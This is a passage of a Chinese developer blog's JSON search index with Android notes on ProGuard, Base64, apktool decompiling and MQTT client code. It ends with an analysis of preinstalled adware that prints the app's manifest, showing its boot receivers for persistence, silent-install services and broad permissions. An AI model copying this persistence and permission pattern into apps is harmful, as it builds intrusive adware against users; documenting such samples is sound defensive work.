，是不能创建一个C++的Module的。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"ndk","slug":"ndk","permalink":"http://yoursite.com/tags/ndk/"}]},{"title":"Android-列表Item滑出菜单方案选择","slug":"Android/Android-列表Item滑出菜单方案选择","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.110Z","comments":true,"path":"Android/Android-列表Item滑出菜单方案选择/","link":"","permalink":"http://yoursite.com/Android/Android-列表Item滑出菜单方案选择/","excerpt":"","text":"Android 列表现在有两种选择：ListView和RecyclerView SwipeMenuListView ：它是ListView的扩展，作为一个自定义view； AndroidSwipeLayout 支持 ListView/Gridview 和 RecyclerView 使用方法：https://github.com/daimajia/AndroidSwipeLayout/wiki/usage","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Android-Studio下载地址","slug":"Android/Android-Studio下载地址","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.109Z","comments":true,"path":"Android/Android-Studio下载地址/","link":"","permalink":"http://yoursite.com/Android/Android-Studio下载地址/","excerpt":"","text":"稳定版 预览版","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Android-混淆","slug":"Android/Android-混淆","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.112Z","comments":true,"path":"Android/Android-混淆/","link":"","permalink":"http://yoursite.com/Android/Android-混淆/","excerpt":"","text":"拷贝以下的内容（https://developer.android.com/studio/build/shrink-code.html），以防平时不能访问 ，有条件的可以访问原文，排版更好，看得舒服。 压缩代码和资源 要尽可能减小 APK 文件，您应该启用压缩来移除发布构建中未使用的代码和资源。此页面介绍如何执行该操作，以及如何指定要在构建时保留或舍弃的代码和资源。代码压缩通过 ProGuard 提供，ProGuard 会检测和移除封装应用中未使用的类、字段、方法和属性，包括自带代码库中的未使用项（这使其成为以变通方式解决 64k 引用限制的有用工具）。ProGuard 还可优化字节码，移除未使用的代码指令，以及用短名称混淆其余的类、字段和方法。混淆过的代码可令您的 APK 难以被逆向工程，这在应用使用许可验证等安全敏感性功能时特别有用。资源压缩通过适用于 Gradle 的 Android 插件提供，该插件会移除封装应用中未使用的资源，包括代码库中未使用的资源。它可与代码压缩发挥协同效应，使得在移除未使用的代码后，任何不再被引用的资源也能安全地移除。本文介绍的功能依赖下列组件：SDK Tools 25.0.10 或更高版本适用于 Gradle 的 Android 插件 2.0.0 或更高版本 压缩代码 要通过 ProGuard 启用代码压缩，请在 build.gradle 文件内相应的构建类型中添加 minifyEnabled true。请注意，代码压缩会拖慢构建速度，因此您应该尽可能避免在调试构建中使用。不过，重要的是您一定要为用于测试的最终 APK 启用代码压缩，因为如果您不能充分地自定义要保留的代码，可能会引入错误。例如，下面这段来自 build.gradle 文件的代码用于为发布构建启用代码压缩：android { buildTypes { release { minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } } …}注：Android Studio 会在使用 Instant Run 时停用 ProGuard。如果您需要为增量式构建压缩代码，请尝试试用 Gradle 压缩器。除了 minifyEnabled 属性外，还有用于定义 ProGuard 规则的 proguardFiles 属性：getDefaultProguardFile(‘proguard-android.txt’) 方法可从 Android SDK tools/proguard/ 文件夹获取默认的 ProGuard 设置。提示：要想做进一步的代码压缩，请尝试使用位于同一位置的 proguard-android-optimize.txt 文件。它包括相同的 ProGuard 规则，但还包括其他在字节码一级（方法内和方法间）执行分析的优化，以进一步减小 APK 大小和帮助提高其运行速度。 proguard-rules.pro 文件用于添加自定义 ProGuard 规则。默认情况下，该文件位于模块根目录（build.gradle 文件旁）。 要添加更多各构建变体专用的 ProGuard 规则，请在相应的 productFlavor 代码块中再添加一个 proguardFiles 属性。例如，以下 Gradle 文件会向 flavor2 产品定制添加 flavor2-rules.pro。现在 flavor2 使用所有三个 ProGuard 规则，因为还应用了来自 release 代码块的规则。android { … buildTypes { release { minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } } productFlavors { flavor1 { } flavor2 { proguardFile ‘flavor2-rules.pro’ } }}每次构建时 ProGuard 都会输出下列文件：dump.txt 说明 APK 中所有类文件的内部结构。mapping.txt 提供原始与混淆过的类、方法和字段名称之间的转换。seeds.txt 列出未进行混淆的类和成员。usage.txt 列出从 APK 移除的代码。 这些文件保存在 /build/outputs/mapping/release/ 中。自定义要保留的代码对于某些情况，默认 ProGuard 配置文件 (proguard-android.txt) 足以满足需要，ProGuard 会移除所有（并且只会移除）未使用的代码。不过，ProGuard 难以对许多情况进行正确分析，可能会移除应用真正需要的代码。举例来说，它可能错误移除代码的情况包括：当应用引用的类只来自 AndroidManifest.xml 文件时当应用调用的方法来自 Java 原生接口 (JNI) 时当应用在运行时（例如使用反射或自检）操作代码时 测试应用应该能够发现因不当移除的代码而导致的错误，但您也可以通过查看 /build/outputs/mapping/release/ 中保存的 usage.txt 输出文件来检查移除了哪些代码。要修正错误并强制 ProGuard 保留特定代码，请在 ProGuard 配置文件中添加一行 -keep 代码。例如：-keep public class MyClass或者，您可以向您想保留的代码添加 @Keep 注解。在类上添加 @Keep 可原样保留整个类。在方法或字段上添加它可完整保留方法/字段（及其名称）以及类名称。请注意，只有在使用注解支持库时，才能使用此注解。在使用 -keep 选项时，有许多事项需要考虑；如需了解有关自定义配置文件的详细信息，请阅读 ProGuard 手册。问题排查一章概述了您可能会在混淆代码时遇到的其他常见问题。解码混淆过的堆叠追踪在 ProGuard 压缩代码后，读取堆叠追踪变得困难（即使并非不可行），因为方法名称经过了混淆处理。幸运的是，ProGuard 每次运行时都会创建一个 mapping.txt 文件，其中显示了与混淆过的名称对应的原始类名称、方法名称和字段名称。ProGuard 将该文件保存在应用的 /build/outputs/mapping/release/ 目录中。请注意，您每次使用 ProGuard 创建发布构建时都会覆盖 mapping.txt 文件，因此您每次发布新版本时都必须小心地保存一个副本。通过为每个发布构建保留一个 mapping.txt 文件副本，您就可以在用户提交的已混淆堆叠追踪来自旧版本应用时对问题进行调试。在 Google Play 上发布应用时，您可以上传每个 APK 版本的 mapping.txt 文件。Google Play 将根据用户报告的问题对收到的堆叠追踪进行去混淆处理，以便您在 Google Play Developer Console 中进行检查。如需了解详细信息，请参阅帮助中心有关如何对崩溃堆叠追踪进行去混淆处理的文章。要自行将混淆过的堆叠追踪转换成可读的堆叠追踪，请使用 retrace 脚本（在 Windows 上为 retrace.bat；在 Mac/Linux 上为 retrace.sh）。它位于 /tools/proguard/ 目录中。该脚本利用 mapping.txt 文件和您的堆叠追踪生成新的可读堆叠追踪。使用 retrace 工具的语法如下：retrace.bat|retrace.sh [-verbose] mapping.txt [&lt;stacktrace_file&gt;]例如：retrace.bat -verbose mapping.txt obfuscated_trace.txt如果您不指定堆叠追踪文件，retrace 工具会从标准输入读取。通过 Instant Run 启用代码压缩如果代码压缩在您增量构建应用时非常重要，请尝试适用于 Gradle 的 Android 插件内置的试用代码压缩器。与 ProGuard 不同，此压缩器支持 Instant Run。您也可以使用与 ProGuard 相同的配置文件来配置 Android 插件压缩器。但是，Android 插件压缩器不会对您的代码进行混淆处理或优化，它只会删除未使用的代码。因此，您应该仅将其用于调试构建，并为发布构建启用 ProGuard，以便对发布 APK 的代码进行混淆处理和优化。要启用 Android 插件压缩器，只需在 “debug” 构建类型中将 useProguard 设置为 false（并保留 minifyEnabled 设置 true）：android { buildTypes { debug { minifyEnabled true useProguard false proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } release { minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } }}注：如果 Android 插件压缩器最初删除了某个方法，但您之后更改了代码，使该方法可访问，Instant Run 会将其视为结构代码更改并执行冷交换。压缩资源资源压缩只与代码压缩协同工作。代码压缩器移除所有未使用的代码后，资源压缩器便可确定应用仍然使用的资源。这在您添加包含资源的代码库时体现得尤为明显 - 您必须移除未使用的库代码，使库资源变为未引用资源，才能通过资源压缩器将它们移除。要启用资源压缩，请在 build.gradle 文件中将 shrinkResources 属性设置为 true（在用于代码压缩的 minifyEnabled 旁边）。例如：android { … buildTypes { release { shrinkResources true minifyEnabled true proguardFiles getDefaultProguardFile(‘proguard-android.txt’), ‘proguard-rules.pro’ } }}如果您尚未使用代码压缩用途的 minifyEnabled 构建应用，请先尝试使用它，然后再启用 shrinkResources，因为您可能需要编辑 proguard-rules.pro文件以保留动态创建或调用的类或方法，然后再开始移除资源。注：资源压缩器目前不会移除 values/ 文件夹中定义的资源（例如字符串、尺寸、样式和颜色）。这是因为 Android 资源打包工具 (AAPT) 不允许 Gradle 插件为资源指定预定义版本。有关详情，请参阅问题 70869。自定义要保留的资源如果您有想要保留或舍弃的特定资源，请在您的项目中创建一个包含 标记的 XML 文件，并在 tools:keep 属性中指定每个要保留的资源，在 tools:discard 属性中指定每个要舍弃的资源。这两个属性都接受逗号分隔的资源名称列表。您可以使用星号字符作为通配符。例如：&lt;?xml version=”1.0” encoding=”utf-8”?&gt;将该文件保存在项目资源中，例如，保存在 res/raw/keep.xml。构建不会将该文件打包到 APK 之中。指定要舍弃的资源可能看似愚蠢，因为您本可将它们删除，但在使用构建变体时，这样做可能很有用。例如，如果您明知给定资源表面上会在代码中使用（并因此不会被压缩器移除），但实际不会用于给定构建变体，就可以将所有资源放入公用项目目录，然后为每个构建变体创建一个不同的 keep.xml 文件。构建工具也可能无法根据需要正确识别资源，这是因为编译器会添加内联资源 ID，而资源分析器可能不知道真正引用的资源和恰巧具有相同值的代码中的整数值之间的差别。启用严格引用检查正常情况下，资源压缩器可准确判定系统是否使用了资源。不过，如果您的代码调用 Resources.getIdentifier())（或您的任何库进行了这一调用 - AppCompat 库会执行该调用），这就表示您的代码将根据动态生成的字符串查询资源名称。当您执行这一调用时，默认情况下资源压缩器会采取防御性行为，将所有具有匹配名称格式的资源标记为可能已使用，无法移除。例如，以下代码会使所有带 img_ 前缀的资源标记为已使用。String name = String.format(“img_%1d”, angle + 1);res = getResources().getIdentifier(name, “drawable”, getPackageName());资源压缩器还会浏览代码以及各种 res/raw/ 资源中的所有字符串常量，寻找格式类似于 file:///android_res/drawable//ic_plus_anim_016.png 的资源网址。如果它找到与其类似的字符串，或找到其他看似可用来构建与其类似的网址的字符串，则不会将它们移除。这些是默认情况下启用的安全压缩模式的示例。但您可以停用这一“有备无患”处理方式，并指定资源压缩器只保留其确定已使用的资源。要执行此操作，请在 keep.xml 文件中将 shrinkMode 设置为 strict，如下所示：&lt;?xml version=”1.0” encoding=”utf-8”?&gt;如果您确已启用严格压缩模式，并且代码也引用了包含动态生成字符串的资源（如上所示），则必须利用 tools:keep 属性手动保留这些资源。移除未使用的备用资源Gradle 资源压缩器只会移除未被您的应用代码引用的资源，这意味着它不会移除用于不同设备配置的备用资源。必要时，您可以使用 Android Gradle 插件的 resConfigs 属性来移除您的应用不需要的备用资源文件。例如，如果您使用的库包含语言资源（例如使用的是 AppCompat 或 Google Play 服务），则 APK 将包括这些库中消息的所有已翻译语言字符串，无论应用的其余部分是否翻译为同一语言。如果您想只保留应用正式支持的语言，则可以利用 resConfig 属性指定这些语言。系统会移除未指定语言的所有资源。下面这段代码展示了如何将语言资源限定为仅支持英语和法语：android { defaultConfig { … resConfigs “en”, “fr” }}同理，您也可以利用 APK 拆分为不同设备构建不同的 APK，自定义在 APK 中包括的屏幕密度或 ABI 资源。合并重复资源默认情况下，Gradle 还会合并同名资源，例如可能位于不同资源文件夹中的同名可绘制对象。这一行为不受 shrinkResources 属性控制，也无法停用，因为在有多个资源匹配代码查询的名称时，有必要利用这一行为来避免错误。只有在两个或更多个文件具有完全相同的资源名称、类型和限定符时，才会进行资源合并。Gradle 会在重复项中选择其视为最佳选择的文件（根据下述优先顺序），并只将这一个资源传递给 AAPT，以供在 APK 文件中分发。Gradle 会在下列位置寻找重复资源：与主源集关联的主资源，一般位于 src/main/res/ 中。变体叠加，来自构建类型和构建风味。库项目依赖项。 Gradle 会按以下级联优先顺序合并重复资源：依赖项 → 主资源 → 构建风味 → 构建类型例如，如果某个重复资源同时出现在主资源和构建风味中，Gradle 会选择构建风味中的重复资源。如果完全相同的资源出现在同一源集中，Gradle 无法合并它们，并且会发出资源合并错误。如果您在 build.gradle 文件的 sourceSet 属性中定义了多个源集，则可能会发生这种情况，例如，如果 src/main/res/ 和 src/main/res2/ 包含完全相同的资源，就可能会发生这种情况。排查资源压缩问题当您压缩资源时，Gradle Console 会显示它从应用软件包中移除的资源的摘要。例如：:android:shrinkDebugResourcesRemoved unused resources: Binary resource data reduced from 2570KB to 1711KB: Removed 33%:android:validateDebugSigningGradle 还会在 /build/outputs/mapping/release/（ProGuard 输出文件所在的文件夹）中创建一个名为 resources.txt 的诊断文件。该文件包括诸如哪些资源引用了其他资源以及使用或移除了哪些资源等详情。 例如，要了解您的 APK 为何仍包含 @drawable/ic_plus_anim_016，请打开 resources.txt 文件并搜索该文件名。您可能会发现，有其他资源引用了它，如下所示：16:25:48.005 [QUIET] [system.out] @drawable/add_schedule_fab_icon_anim : reachable=true16:25:48.009 [QUIET] [system.out] @drawable/ic_plus_anim_016现在您需要了解为何 @drawable/add_schedule_fab_icon_anim 可以访问 - 如果您向上搜索，就会发现“The root reachable resources are:”之下列有该资源。这意味着存在对 add_schedule_fab_icon_anim 的代码引用（即在可访问代码中找到了其 R.drawable ID）。如果您使用的不是严格检查，则存在看似可用于为动态加载资源构建资源名称的字符串常量时，可将资源 ID 标记为可访问。在这种情况下，如果您在构建输出中搜索资源名称，可能会找到类似下面这样的消息：10:32:50.590 [QUIET] [system.out] Marking drawable:ic_plus_anim_016:2130837506 used because it format-string matches string pool constant ic_plus_anim_%1$d.如果您看到一个这样的字符串，并且您能确定该字符串未用于动态加载给定资源，就可以按照有关如何自定义要保留的资源部分中所述利用 tools:discard 属性通知构建系统将它移除。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Java和Android的Base64加密解密","slug":"Android/Java和Android的Base64加密解密","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.118Z","comments":true,"path":"Android/Java和Android的Base64加密解密/","link":"","permalink":"http://yoursite.com/Android/Java和Android的Base64加密解密/","excerpt":"","text":"Java8Java8上的自带Base64工具java.util.Base64; 123456//编码Base64.getEncoder().encodeToString(\"Hello\".getBytes(\"utf-8\")); //解码byte[] asBytes = Base64.getDecoder().decode(\"SGVsbG8=\"); System.out.println(new String(asBytes, \"utf-8\")); AndroidAndroid SDK 自带 android.util.Base64; Public methods static byte[] decode(String str, int flags) Decode the Base64-encoded data in input and return the data in a new byte array. static byte[] decode(byte[] input, int flags) Decode the Base64-encoded data in input and return the data in a new byte array. static byte[] decode(byte[] input, int offset, int len, int flags) Decode the Base64-encoded data in input and return the data in a new byte array. static byte[] encode(byte[] input, int flags) Base64-encode the given data and return a newly allocated byte[] with the result. static byte[] encode(byte[] input, int offset, int len, int flags) Base64-encode the given data and return a newly allocated byte[] with the result. static String encodeToString(byte[] input, int offset, int len, int flags) Base64-encode the given data and return a newly allocated String with the result. static String encodeToString(byte[] input, int flags) Base64-encode the given data and return a newly allocated String with the result. 12345678910111213141516import android.util.Base64;//编码public static String getEncoder(String str) throws UnsupportedEncodingException &#123; //return Base64.encodeToString(str.getBytes(\"utf-8\"),Base64.DEFAULT); //android sdk 27 return Base64.encode(str.getBytes(\"utf-8\"),Base64.DEFAULT);&#125;//解码public static String getDecoder(String encode) throws UnsupportedEncodingException &#123; byte[] asBytes = Base64.decode(encode,Base64.DEFAULT); return new String(asBytes, \"utf-8\");&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"apktool","slug":"Android/apktool","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.121Z","comments":true,"path":"Android/apktool/","link":"","permalink":"http://yoursite.com/Android/apktool/","excerpt":"","text":"onekey-decompile-apk不更新apktool就没什么用了，这时候可以直接用apktool 下载地址： https://ibotpeaches.github.io/Apktool/install/下载bat：https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat 用win的终端运行：apktool d xx.apk","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"MQTT-Client库-org-fusesource-mqtt-client","slug":"Android/MQTT-Client库-org-fusesource-mqtt-client","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.120Z","comments":true,"path":"Android/MQTT-Client库-org-fusesource-mqtt-client/","link":"","permalink":"http://yoursite.com/Android/MQTT-Client库-org-fusesource-mqtt-client/","excerpt":"","text":"由于不太想用Eclipse的库，寻求其他库来试试。 org.fusesource.mqtt-client 也是MQTT推荐 client 端的库，github的start也有500+吧，fork也有200+。 引用库1compile &apos;org.fusesource.mqtt-client:mqtt-client:1.12&apos; 作者给出了三种使用方法：1.阻塞；2.非阻塞（推荐）；3.Future（没理解？） Github上的 非阻塞 示例：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657final CallbackConnection connection = mqtt.callbackConnection();connection.listener(new Listener() &#123; public void onDisconnected() &#123; &#125; public void onConnected() &#123; &#125; public void onPublish(UTF8Buffer topic, Buffer payload, Runnable ack) &#123; // You can now process a received message from a topic. // Once process execute the ack runnable. ack.run(); &#125; public void onFailure(Throwable value) &#123; connection.close(null); // a connection failure occured. &#125;&#125;)connection.connect(new Callback&lt;Void&gt;() &#123; public void onFailure(Throwable value) &#123; result.failure(value); // If we could not connect to the server. &#125; // Once we connect.. public void onSuccess(Void v) &#123; // Subscribe to a topic Topic[] topics = &#123;new Topic(&quot;foo&quot;, QoS.AT_LEAST_ONCE)&#125;; connection.subscribe(topics, new Callback&lt;byte[]&gt;() &#123; public void onSuccess(byte[] qoses) &#123; // The result of the subcribe request. &#125; public void onFailure(Throwable value) &#123; connection.close(null); // subscribe failed. &#125; &#125;); // Send a message to a topic connection.publish(&quot;foo&quot;, &quot;Hello&quot;.getBytes(), QoS.AT_LEAST_ONCE, false, new Callback&lt;Void&gt;() &#123; public void onSuccess(Void v) &#123; // the pubish operation completed successfully. &#125; public void onFailure(Throwable value) &#123; connection.close(null); // publish failed. &#125; &#125;); // To disconnect.. connection.disconnect(new Callback&lt;Void&gt;() &#123; public void onSuccess(Void v) &#123; // called once the connection is disconnected. &#125; public void onFailure(Throwable value) &#123; // Disconnects never fail. &#125; &#125;); &#125;&#125;); 上面代码片段在Android和纯Java程序都可以执行，需要注意的是，纯Java要用一个阻塞事件（如输入）来阻止main函数结束运行。 Android：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161import android.os.Bundle;import android.os.Handler;import android.os.Message;import android.support.annotation.Nullable;import android.util.Log;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.widget.TextView;import org.fusesource.hawtbuf.Buffer;import org.fusesource.hawtbuf.UTF8Buffer;import org.fusesource.mqtt.client.Callback;import org.fusesource.mqtt.client.CallbackConnection;import org.fusesource.mqtt.client.Listener;import org.fusesource.mqtt.client.MQTT;import org.fusesource.mqtt.client.QoS;import org.fusesource.mqtt.client.Topic;import butterknife.BindString;import butterknife.BindView;import butterknife.ButterKnife;import butterknife.Unbinder;import cn.content.DefaultValue;public class FragmentMqtt extends FragmentBase &#123; private final String TAG = getClass().getName(); @BindView(R.id.tv_hello) TextView tvHello; private Unbinder unbinder; private ActContainer context; @BindString(R.string.title_name_mqtt) String title; private String devTopic; CallbackConnection connection; @Override public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); &#125; @Override public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) &#123; View rootView = inflater.inflate(R.layout.fragment_mqtt, null); unbinder = ButterKnife.bind(this, rootView); return rootView; &#125; @Override public void onViewCreated(View rootView, @Nullable Bundle savedInstanceState) &#123; super.onViewCreated(rootView, savedInstanceState); context = (ActContainer) getActivity(); context.setTitleName(title); devTopic = &quot;hello&quot;; try &#123; MQTT mqtt = new MQTT(); mqtt.setHost(&quot;192.168.1.150&quot;, 1883); connection = mqtt.callbackConnection(); connection.listener(new Listener() &#123; public void onDisconnected() &#123; Log.i(TAG, &quot;onDisconnected.&quot;); sendMessageUI(0,&quot;onDisconnected&quot;); &#125; public void onConnected() &#123; Log.i(TAG, &quot;onConnected.&quot;); sendMessageUI(0,&quot;onConnected&quot;); &#125; public void onPublish(UTF8Buffer topic, Buffer payload, Runnable ack) &#123; // You can now process a received message from a topic. // Once process execute the ack runnable. ack.run(); Log.i(TAG, &quot;onPublish: &quot; + payload.toString()); //不能操作UI //tvHello.setText(payload.toString()); sendMessageUI(1,payload.toString()); &#125; public void onFailure(Throwable value) &#123; //connection.close(null); // a connection failure occured. connection.disconnect(null); &#125; &#125;); connection.connect(new Callback&lt;Void&gt;() &#123; public void onFailure(Throwable value) &#123; //result.failure(value); // If we could not connect to the server. Log.e(TAG, &quot;connect failure.&quot;); &#125; // Once we connect.. public void onSuccess(Void v) &#123; // Subscribe to a topic Topic[] topics = &#123;new Topic(devTopic, QoS.AT_LEAST_ONCE)&#125;; connection.subscribe(topics, new Callback&lt;byte[]&gt;() &#123; public void onSuccess(byte[] qoses) &#123; // The result of the subcribe request. Log.i(TAG, &quot;subscribe onSuccess.topic:&quot; + devTopic); //不能操作UI //tvHello.setText(&quot;subscribe onSuccess.&quot;); sendMessageUI(0,&quot;subscribe onSuccess.&quot;); &#125; public void onFailure(Throwable value) &#123; //connection.close(null); // subscribe failed. Log.e(TAG, &quot;subscribe failed.&quot;); sendMessageUI(0,&quot;subscribe failed.&quot;); &#125; &#125;); &#125; &#125;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void sendMessageUI(int what, String obj) &#123; Message message = Message.obtain(); message.what = what; message.obj = obj; handler.sendMessage(message); &#125; private Handler handler = new Handler() &#123; @Override public void handleMessage(Message msg) &#123; if(tvHello!=null)&#123; switch (msg.what) &#123; case 1: //数据 tvHello.setText(msg.obj.toString()); break; default: //事件 tvHello.setText(msg.obj.toString()); break; &#125; &#125; super.handleMessage(msg); &#125; &#125;; @Override public void onDestroyView() &#123; super.onDestroyView(); unbinder.unbind(); connection.disconnect(null); &#125;&#125; Java：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.demo;import java.util.Scanner;import org.fusesource.hawtbuf.Buffer;import org.fusesource.hawtbuf.UTF8Buffer;import org.fusesource.mqtt.client.Callback;import org.fusesource.mqtt.client.CallbackConnection;import org.fusesource.mqtt.client.Listener;import org.fusesource.mqtt.client.MQTT;import org.fusesource.mqtt.client.QoS;import org.fusesource.mqtt.client.Topic;import org.fusesource.mqtt.client.Tracer;import org.fusesource.mqtt.codec.MQTTFrame;public class Test &#123; private static final String Topic = &quot;hello&quot;; public static void main(String[] args) &#123; try&#123; MQTT mqtt = new MQTT(); mqtt.setHost(&quot;192.168.1.150&quot;, 1883); mqtt.setTracer(new Tracer()&#123; @Override public void onReceive(MQTTFrame frame) &#123; System.out.println(&quot;recv: &quot;+frame); &#125; @Override public void onSend(MQTTFrame frame) &#123; System.out.println(&quot;send: &quot;+frame); &#125; @Override public void debug(String message, Object... args) &#123; System.out.println(String.format(&quot;debug: &quot;+message, args)); &#125; &#125;); final CallbackConnection connection = mqtt.callbackConnection(); connection.listener(new Listener() &#123; public void onDisconnected() &#123; System.out.println( &quot;onDisconnected.&quot;); &#125; public void onConnected() &#123; System.out.println(&quot;onConnected.&quot;); &#125; public void onPublish(UTF8Buffer topic, Buffer payload, Runnable ack) &#123; // You can now process a received message from a topic. // Once process execute the ack runnable. ack.run(); System.out.println( &quot;onPublish: &quot; + payload.toString()); &#125; public void onFailure(Throwable value) &#123; //connection.close(null); // a connection failure occured. connection.disconnect(null); &#125; &#125;); System.out.println(&quot;callback...&quot;); connection.connect(new Callback&lt;Void&gt;() &#123; public void onFailure(Throwable value) &#123; //result.failure(value); // If we could not connect to the server. System.out.println( &quot;connect failure.&quot;); &#125; // Once we connect.. public void onSuccess(Void v) &#123; System.out.println( &quot;connect onSuccess.&quot;); // Subscribe to a topic Topic[] topics = &#123;new Topic(Topic, QoS.AT_LEAST_ONCE)&#125;; connection.subscribe(topics, new Callback&lt;byte[]&gt;() &#123; public void onSuccess(byte[] qoses) &#123; // The result of the subcribe request. System.out.println( &quot;subscribe onSuccess.&quot;); connection.publish(Topic, &quot;Hello&quot;.getBytes(), QoS.AT_LEAST_ONCE, false, null); &#125; public void onFailure(Throwable value) &#123; //connection.close(null); // subscribe failed. System.out.println( &quot;subscribe failed.&quot;); &#125; &#125;); &#125; &#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; //输入阻塞 Scanner sc = new Scanner(System.in); sc.nextLine(); &#125;&#125; 各种参数这里有一篇文章写的很详细，我就懒的写了 传送门。 在Linux下无法连接写了个web程序在Linux下部署发现一个问题，无法连接上服务器，没有任何报错的信息。（在Windows下是正常连接的）网上找一下，原来这个库会获取Host，失败就卡住了，我的Linux机器修改过HostName，所以就出问题了。其实这个问题在spring-boot-starter-data-redis也存在，但是spring-boot-starter-data-redis有报错信息。解决办法也比较简单，把当前的HostName加入到/etc/hosts文件就可以了123456root@bogon:~# hostnamebogonroot@bogon:~# vim /etc/hosts#加入127.0.1.1 bogon","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"com-xym-ma流氓软件","slug":"Android/com-xym-ma流氓软件","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.122Z","comments":true,"path":"Android/com-xym-ma流氓软件/","link":"","permalink":"http://yoursite.com/Android/com-xym-ma流氓软件/","excerpt":"","text":"Android机子刷机，遇到个频率（几秒一次）弹广告的内置流氓软件，作为service运行，可以进程保活，也就是强行关闭进程，它可以重新启动，非常恶心，时不时就来一个全屏广告，自动下载其他的apk安装包，自动安装。电脑管家是识别为木马的。看了一下他的 AndroidManifest.xml1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.xym.ma&quot; platformBuildVersionCode=&quot;19&quot; platformBuildVersionName=&quot;4.4.2-1456859&quot;&gt; &lt;application android:icon=&quot;@drawable/ic_launcher&quot; android:label=&quot;xym&quot; android:name=&quot;com.xym.ma.a&quot;&gt; &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.xym.ma.b&quot; android:screenOrientation=&quot;portrait&quot; android:theme=&quot;@android:style/Theme.Translucent&quot;/&gt; &lt;meta-data android:name=&quot;googlepotatooid&quot; android:value=&quot;712c9cef25b42dc4&quot;/&gt; &lt;meta-data android:name=&quot;googlepotatoo_channel&quot; android:value=&quot;ch0117&quot;/&gt; &lt;meta-data android:name=&quot;googlepotatoo_jd&quot; android:value=&quot;true&quot;/&gt; &lt;activity android:name=&quot;com.zuhn.mkn.d.a&quot; android:screenOrientation=&quot;portrait&quot; android:theme=&quot;@android:style/Theme.Translucent.NoTitleBar&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.zuhn.mkn.activity&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;service android:exported=&quot;true&quot; android:name=&quot;com.zuhn.mkn.b.a&quot;/&gt; &lt;receiver android:name=&quot;com.zuhn.mkn.a.b&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt; &lt;action android:name=&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;/&gt; &lt;action android:name=&quot;android.intent.action.USER_PRESENT&quot;/&gt; &lt;action android:name=&quot;com.zuhn.mkn.destory&quot;/&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;activity android:label=&quot;JDBrowserActivity&quot; android:name=&quot;com.jd.jdadsdk.JDAdBrowser&quot; android:screenOrientation=&quot;portrait&quot; android:theme=&quot;@android:style/Theme.Translucent.NoTitleBar&quot;/&gt; &lt;service android:exported=&quot;false&quot; android:name=&quot;com.qq.e.comm.DownloadService&quot;/&gt; &lt;activity android:configChanges=&quot;keyboard|keyboardHidden|orientation|screenSize&quot; android:name=&quot;com.qq.e.ads.ADActivity&quot;/&gt; &lt;/application&gt; &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt; &lt;uses-permission android:name=&quot;com.android.launcher.permission.UNINSTALL_SHORTCUT&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt; &lt;uses-permission android:name=&quot;com.android.launcher.permission.INSTALL_SHORTCUT&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.GET_TASKS&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; &lt;uses-permission 